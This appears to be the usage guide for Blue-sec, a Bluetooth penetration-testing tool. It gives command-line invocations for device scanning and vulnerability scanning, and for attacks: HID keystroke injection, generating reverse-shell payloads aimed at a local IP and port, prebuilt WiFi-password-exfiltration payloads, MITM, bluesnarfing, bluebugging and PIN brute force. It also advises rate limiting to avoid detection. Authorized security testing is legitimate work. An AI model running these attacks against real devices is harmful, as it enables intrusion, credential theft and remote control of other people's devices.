# Blue-sec Usage Guide

## Table of Contents

1. [Installation](#installation)
2. [Basic Usage](#basic-usage)
3. [HID Attacks (NEW!)](#hid-attacks)
4. [Vulnerability Scanning](#vulnerability-scanning)
5. [Attack Simulation](#attack-simulation)
6. [Enterprise Features](#enterprise-features)

---

## Installation

### Requirements

- Python 3.11 or higher
- Root/Administrator privileges
- Bluetooth adapter with BLE capability
- Linux, macOS, or Windows

### Quick Install

```bash
# Clone the repository
git clone https://github.com/irfan-sec/Blue-sec.git
cd Blue-sec

# Install dependencies
pip install -r requirements.txt

# Run Blue-sec
sudo python3 blue-sec.py --help
```

### Docker Installation

```bash
# Build the image
docker build -t blue-sec .

# Run in container
docker run --net=host --privileged -it blue-sec
```

## Basic Usage

### Device Discovery

Scan for all Bluetooth devices:

```bash
sudo python3 blue-sec.py scan
```

Scan only BLE devices:

```bash
sudo python3 blue-sec.py scan --type ble
```

Scan with custom duration:

```bash
sudo python3 blue-sec.py scan --type all --duration 60
```

### Device Information

Get detailed information about a specific device:

```bash
sudo python3 blue-sec.py info AA:BB:CC:DD:EE:FF
```

Enumerate services and characteristics:

```bash
sudo python3 blue-sec.py info AA:BB:CC:DD:EE:FF --enumerate
```

---

## HID Attacks

**NEW!** Blue-sec now supports real-time HID (keyboard/mouse) attacks similar to BlueDucky and Rubber Ducky.

### Quick Test (Harmless)

Test with a harmless payload:

```bash
# Rickroll test
sudo python3 blue-sec.py hid-test AA:BB:CC:DD:EE:FF \
  --payload data/payloads/hid/rickroll_test.json

# Keyboard test
sudo python3 blue-sec.py hid-test AA:BB:CC:DD:EE:FF \
  --payload data/payloads/hid/test_keyboard.json
```

### Interactive Mode

Start an interactive HID testing session:

```bash
sudo python3 blue-sec.py hid-test AA:BB:CC:DD:EE:FF --interactive
```

Commands in interactive mode:
- `type <text>` - Type text
- `key <key>` - Press a key
- `combo CTRL+C` - Key combination
- `payload <file>` - Execute payload
- `disconnect` - End session

### Generate Custom Payloads

Create reverse shell payload:

```bash
sudo python3 blue-sec.py generate-payload \
  --name "My Shell" \
  --type reverse_shell \
  --os linux \
  --ip 192.168.1.100 \
  --port 4444 \
  --output my_payload.json
```

Generate info gathering payload:

```bash
sudo python3 blue-sec.py generate-payload \
  --name "System Info" \
  --type info_gather \
  --os windows \
  --output sysinfo.json
```

### Available Payloads

Pre-built payloads in `data/payloads/hid/`:
- `test_keyboard.json` - Keyboard functionality test
- `rickroll_test.json` - Harmless demonstration
- `info_gather_windows.json` - System information gathering
- `wifi_exfil_windows.json` - WiFi password extraction
- `reverse_shell_linux.json` - Linux reverse shell
- `reverse_shell_windows.json` - Windows reverse shell

**See [HID_ATTACKS.md](HID_ATTACKS.md) for comprehensive HID attack documentation.**

---

## Vulnerability Scanning

Scan a device for known vulnerabilities:

```bash
sudo python3 blue-sec.py vuln-scan AA:BB:CC:DD:EE:FF
```

Generate HTML report:

```bash
sudo python3 blue-sec.py vuln-scan AA:BB:CC:DD:EE:FF --format html
```

### Attack Simulations

**Warning:** Only use on devices you own or have explicit permission to test.

#### MITM Attack

```bash
sudo python3 blue-sec.py attack --type mitm \
  --target AA:BB:CC:DD:EE:FF \
  --target2 11:22:33:44:55:66
```

#### Bluesnarfing

```bash
sudo python3 blue-sec.py attack --type bluesnarfing \
  --target AA:BB:CC:DD:EE:FF
```

#### Bluebugging

```bash
sudo python3 blue-sec.py attack --type bluebugging \
  --target AA:BB:CC:DD:EE:FF \
  --command "test_command"
```

#### Bluejacking

```bash
sudo python3 blue-sec.py attack --type bluejacking \
  --target AA:BB:CC:DD:EE:FF \
  --message "Test message"
```

#### PIN Brute Force

```bash
sudo python3 blue-sec.py attack --type pin_bruteforce \
  --target AA:BB:CC:DD:EE:FF \
  --pin-length 4
```

### Security Audit

Perform comprehensive security audit:

```bash
sudo python3 blue-sec.py audit
```

Generate HTML report:

```bash
sudo python3 blue-sec.py audit --format html
```

### CVE Database

List all known Bluetooth CVEs:

```bash
python3 blue-sec.py list-cves
```

## Advanced Usage

### Custom Configuration

Create a custom configuration file:

```yaml
# config/my-config.yaml
scanner:
  active_scan_timeout: 20
  passive_scan_duration: 60

security:
  require_confirmation: false
  max_attempts: 5

attack:
  enable_bruteforce: true
  max_bruteforce_attempts: 5000
```

Use custom configuration:

```bash
sudo python3 blue-sec.py --config config/my-config.yaml scan
```

### Debug Mode

Enable debug logging:

```bash
sudo python3 blue-sec.py --debug scan
```

Log to file:

```bash
sudo python3 blue-sec.py --log-file blue-sec.log scan
```

### Programmatic Usage

Use Blue-sec as a Python library:

```python
import asyncio
from modules import (
    load_config, DeviceScanner, CVEDatabase,
    VulnerabilityScanner, AttackManager
)

async def main():
    # Load configuration
    config = load_config()
    
    # Scan for devices
    scanner = DeviceScanner(config.scanner)
    devices = await scanner.scan_ble_devices()
    
    # Scan for vulnerabilities
    cve_db = CVEDatabase()
    vuln_scanner = VulnerabilityScanner(cve_db)
    
    for device in devices:
        vulns = await vuln_scanner.scan_device(device)
        print(f"{device.name}: {len(vulns)} vulnerabilities")

if __name__ == "__main__":
    asyncio.run(main())
```

## Report Formats

Blue-sec supports multiple report formats:

- **JSON** - Machine-readable format (default)
- **XML** - Structured XML format
- **HTML** - Human-readable HTML reports

Reports are saved in the `reports/` directory.

## Best Practices

1. **Authorization**: Only test devices you own or have explicit permission to test
2. **Rate Limiting**: Use rate limiting to avoid detection and device overload
3. **Documentation**: Document all testing activities and findings
4. **Legal Compliance**: Ensure compliance with local laws and regulations
5. **Responsible Disclosure**: Report vulnerabilities to vendors responsibly

## Troubleshooting

### Permission Denied

Ensure you're running with root/administrator privileges:

```bash
sudo python3 blue-sec.py scan
```

### Bluetooth Adapter Not Found

Check if Bluetooth adapter is enabled:

```bash
# Linux
hciconfig
sudo hciconfig hci0 up

# Check Bluetooth service
sudo systemctl status bluetooth
```

### Dependencies Not Found

Reinstall dependencies:

```bash
pip install -r requirements.txt --force-reinstall
```

### PyBluez Installation Issues

On Linux, install system dependencies:

```bash
sudo apt-get install bluetooth libbluetooth-dev
```

On macOS:

```bash
brew install bluetooth
```

On Windows (Python 3.12/3.13):

- PyBluez 0.23 uses deprecated build tooling and fails to install with errors like "use_2to3 is invalid".
- Blue-sec does not require PyBluez for BLE scans. You can run BLE-only scans:

```powershell
python .\blue-sec.py scan --type ble
```

If you specifically need Classic Bluetooth (BR/EDR) scanning on Windows, use one of these options:

- Use Python 3.10 or 3.11 and then install PyBluez:

```powershell
py -3.11 -m venv .venv; .\.venv\Scripts\Activate.ps1; python -m pip install --upgrade pip; pip install pybluez
```

- Or run Blue-sec inside WSL/Linux or Docker, where BlueZ is available and PyBluez can be installed with system headers.

## Support

For issues, feature requests, or questions:

- GitHub Issues: https://github.com/irfan-sec/Blue-sec/issues
- Email: ceoirfan@cyberlearn.systems
- Website: https://cyberlearn.systems
